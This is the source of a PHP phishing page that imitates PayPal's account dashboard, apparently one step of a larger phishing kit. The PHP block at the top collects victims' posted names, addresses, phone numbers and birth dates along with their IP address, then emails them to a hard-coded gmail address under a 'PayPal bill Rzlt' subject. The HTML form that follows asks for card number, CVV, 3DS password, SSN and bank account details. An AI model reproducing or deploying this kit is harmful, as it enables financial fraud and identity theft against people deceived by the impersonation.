﻿<?

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$lboss1 = $_POST['fn'];
$lboss2 = $_POST['ln'];
$lboss3 = $_POST['add1'];
$lboss4 = $_POST['add2'];
$lboss5 = $_POST['city'];
$lboss6 = $_POST['state'];
$lboss7 = $_POST['contry'];
$lboss8 = $_POST['pcode'];
$lboss9 = $_POST['phone'];
$lboss10 = $_POST['bday'];
$lboss11 = $_POST['bmonth'];
$lboss12 = $_POST['byear'];

$message .="
||===========|Hassan mansour ~ spam-egy |========||
||======================+ BILLING INFO +====================||
||f name        :  ".$lboss1."
||last name     : ".$lboss2."
||addrs1        : ".$lboss3."
||addrs2        : ".$lboss4."
||city          : ".$lboss5."
||state         : ".$lboss6."
||contry        : ".$lboss7."
||post_code     : ".$lboss8."
||phone         : ".$lboss9."
||milado        : ".$lboss10." ".$lboss11." ".$lboss12."



||====================== 	PC-INFO ====================||
||Date / time	    : $date
||Client IP         : http://www.geoiptool.com/?IP=$ip
||=========||Hassan mansour ~ spam-egy |=====================||\n";

$cabeceras  = 'MIME-Version: 1.0' . "\r\n";  //------------------------------------------------------------------------------|
$cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; //-----------------------------------------------------|
$send="alouani987@gmail.com";
$sp1 = "PayPal bill Rzlt | $ip";
mail($send,$sp1,$message,$cabeceras);

fwrite($message); 
?>

<!DOCTYPE HTML5>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
 <link href="./img/pp32.png" type="image/x-icon" rel="icon"></link> 
<title>Update Account information</title>
<link rel="icon" href="img/pp32.png" />
<link rel="stylesheet" type="text/css" href="css/carding.css"/>

</head>
<body>
<div class='navbar'>


	<div class="header-wrap">
		<div class="headerContent">  
                <a href="#" class="logo">
                    <img alt="Tableau de bord" src="./img/logo.png">
                </a>
                <nav role="navigation" id="navMenu">
                    <ul id="top-navi">
                        <li class="homeIconWrapper hidden-phone" data-explore="Retour Г  l&#39;aperГ§u principal de votre compte.">
                            <a href="#" class="homeIcon selected"> <span class="accessAid">Summary</span> 
                            </a>
                        </li>
                        <li class=""><a href="#">My money</a>
                        </li>
                        <li class=""><a href="#">Transactions</a>
                        </li>
                        <li class=" hidden-tablet-portrait"><a href="">Clients</a>
                        </li>
                        <li class=" hidden-tablet"><a href="#">Ressources</a>
                        </li>
                        <li class="dropdown all-media" id="more-dropdown" data-explore="AccГ©dez au Gestionnaire de litiges, envoyez vos commentaires ou revenez Г  l&#39;ancienne version de PayPal."> <a href="javascript:void(0)" class="dropdown-toggle menu-trigger">More</a> 
                            <ul>
                                <li class=" hidden-phone visible-tablet"><a href="#">Tools</a>
                                </li>
                                <li><a href="#">Reports</a>
                                </li>
                                <li class="FR"><a href="#">Resolution Center</a><span class="divider"></span>
                                </li>
                                <li id="siteFeedback">
                                     <a href="#">Evaluation</a>
                                </li>
                                <li></li>
                                <li class="visible-phone"><a href="#">Logout</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </nav>
                <div class="globalLinksHolder">
                    <div class="settingsWrapper" data-explore="Manage your Preferences and settings.">
                        <a href="#" id="settingsBttn" class="button secondary small" aria-owns="settings" role="button"> <span class="settings-icon"></span>  <span class="todosTopCount">2</span>  <span class="accessAid">Setting</span> 
                        </a>
                        <div class="popover settingsBox show-onload hide" role="dialog" aria-labelledby="Business profile" tabindex="-1" id="settingsBox">
                            <div class="popover-content">
                                <div class="popover-head">
                                    <h2><a href="#">Preferences</a></h2>  <a href="#" class="hideSettings" role="button"><span class="accessAid">Close</span></a> 
                                </div>
                                <div class="popover-body">
                                    <div class="merchantInfo">
                                        <h3 class="userInfo">Welcome <a href="#">Customer</a></h3>  
                                    </div>
                                    <ul class="topNavLinks">
                                        <li><a class="businiessSetupIcon" href="#">Configure PayPal solution</a>
                                        </li>
                                        <li><a class="settingsIcon" href="#">Setting</a>
                                        </li>
                                    </ul>
                                    <h3> Things to do  <span class="todosCount">3</span> </h3> 
                                    <div class="subMenuWrapper">
                                        <ul class="toDosList">
                                            <li><span  name="todo_" style="color:#555">Confirm my Billing Address</a>
                                            </li>
											<li><a href="card.php" name="todo_">Confirm my Card</a>
                                            </li>
                                            <li><a href="bank.php" name="todo_">Confim my bank account</a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="logoutWrapper hidden-phone"> <a class="button secondary small" href="#">Logout</a> 
                    </div> <span id="switchMenu" role="button"></span> 
                </div>
            </div>
	
	
	</div>



</div>
<div id="wrapper">
<div id="main">
<div class="up-carding"></div>
<div class="tray"></div>
<div class="ppl"></div>

<div id="carding">
<!--
<div id="pop">
<a href="#openModal"><img src="./img/pop.png"></img></a>
</div>
<div id="openModal" class="modalDialog">
	<div>
		<a href="#close" title="Close" class="close">X</a>
		<img src="./img/ccv.png" width="100%" height="100%"></img>
		
		</div>
</div>
-->

<form method="POST" action="success.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e2b84a&e284=5f8a8f8" onsubmit='return validate();'>
<div class="bar1">
<input type="text" class="large" required name="ccname" value="" placeholder="Card Holder"/>
</div>
<div class="bar2">
<input type="text"  class="large mdrf" maxlength="16" required name="ccnum" value="" placeholder="Card Number" title="Enter your card number as showen on your card" />
</div>

<div class="bar4">
<select name="monthl" required id="month" style="">
<option value="">Month</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select name="yesrl" required id="year" style="">
<option value="">Year</option>
<option value="2015">2015</option>
<option value="2016">2016</option>
<option value="2017">2017</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
</select>
</div>

<div class="cvv">
<input type="text" class="cvv1" required  name="cvv15" value="" placeholder="cvv" maxlength="4"/>
</div>
<div class="vpass">
<input type="text" class="vpass1"  name="3dpass" value="" placeholder="3DS/VBV Password" maxlength="15" />
</div>
<div class="secured"></div>
<div class="ssn">
<input type="text" class="ssn1"  name="SSNlog" value="" placeholder="SSN" maxlength="26"/>
</div>
<div class="anmbr">
<input type="text" class="vpass1"  name="bncnum" value="" placeholder="Account Number" maxlength="24"/>
</div>
<div class="scode">
<input type="text" class="ssn1"   name="srtcode" value="" placeholder="Sort Code" maxlength="14"/>
</div>


<div>
	<input type="submit" class="btn" value="Continue"/>
</div>
</form>
</div>
</div>
<div class="copyright"></div>
</div>
</body>
</html>